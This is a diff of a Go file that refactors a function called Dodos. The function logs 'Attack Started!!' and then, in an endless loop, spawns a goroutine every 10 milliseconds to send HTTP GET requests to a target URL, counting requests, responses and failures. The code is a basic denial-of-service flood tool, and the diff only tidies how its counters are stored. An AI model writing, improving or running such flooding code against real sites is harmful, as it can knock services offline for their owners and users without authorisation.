@@ -5,26 +5,22 @@ import (
   "log"
   "time"
 )
-var Totalrequest int
-var Totalresponse int
-var Totalbounced int
-var URL string
+var Totalrequest = new(int)
+var Totalresponse = new(int)
+var Totalbounced = new(int)
+var URL = new(string)
 
 func Dodos(url string)  {
-  Tr := &Totalrequest
-  Tres := &Totalresponse
-  Tb := &Totalbounced
-  Ur := &URL
-  *Ur = url
+  *URL = url
   log.Print("Attack Started!!")
   for {
     go func ()  {
-      *Tr = *Tr + 1
+      *Totalrequest += 1
       _, err := http.Get(url)
       if err != nil {
-        *Tb = *Tb + 1
+        *Totalbounced += 1
       }else{
-        *Tres = *Tres + 1
+        *Totalresponse += 1
       }
     }()
     time.Sleep(10*time.Millisecond)
